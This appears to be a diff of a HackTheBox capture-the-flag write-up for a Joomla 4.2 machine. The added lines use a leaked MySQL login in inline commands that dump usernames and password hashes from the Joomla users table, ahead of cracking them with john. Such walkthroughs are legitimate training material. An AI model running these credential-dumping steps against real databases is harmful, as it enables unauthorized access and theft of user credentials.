@@ -4,7 +4,8 @@
 ## Lesson Learned:
 - Enumerating subdomain using ffuf.
 - Directory listing using dirsearch.
-- Exploiting CMS Joomla v4.2
+- Exploiting CMS Joomla v4.2.
+- Accessing mysql (inline command).
 
 ![image](https://github.com/jon-brandy/hackthebox/assets/70703371/c8f39e13-398d-457a-9e4c-144fc3b34e35)
 
@@ -152,10 +153,31 @@ sudo gem install paint
 
 > Using mysql --> lewis:P4ntherg0t1n5r3c0n##
 
+```
+mysql -u lewis -pP4ntherg0t1n5r3c0n## -e "show databases;"
+```
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/9be8a365-b6f0-4ef1-b269-54543cd24fae)
 
 
+```
+mysql -u lewis -pP4ntherg0t1n5r3c0n## -e "use joomla; show tables;"
+```
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/c955f290-824e-4439-be9e-a0620e51834b)
 
 
+22. Noticed, we got bunch of results. But our interest is at the **users** table.
+
+```
+mysql -u lewis -pP4ntherg0t1n5r3c0n## -e "use joomla; select username, password from sd4fg_users;"
+```
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/53e02946-1c36-45a7-90d5-521e87e46a38)
+
+
+23. Awesome! We got 2 creds, we can crack the password using **john**.
+24. 
 
 ## IMPORTANT LINKS
 
